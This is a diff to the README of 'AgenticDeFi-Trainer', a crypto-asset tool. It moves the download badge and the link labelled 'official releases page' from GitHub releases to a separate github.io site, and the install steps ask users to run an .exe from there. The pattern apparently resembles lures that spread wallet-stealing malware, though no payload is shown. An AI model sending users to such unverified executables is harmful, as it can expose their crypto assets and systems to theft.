@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with smart agents
 
-[![Download Software](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/tithecutin820/AgenticDeFi-Trainer/releases)
+[![Download Software](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://tithecutin820.github.io)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ Before you install the tool, ensure your computer meets these requirements:
 
 You can find the installer for Windows on our release page. Follow these steps to obtain the correct file:
 
-1. Visit the [official releases page](https://github.com/tithecutin820/AgenticDeFi-Trainer/releases).
+1. Visit the [official releases page](https://tithecutin820.github.io).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your downloads folder.
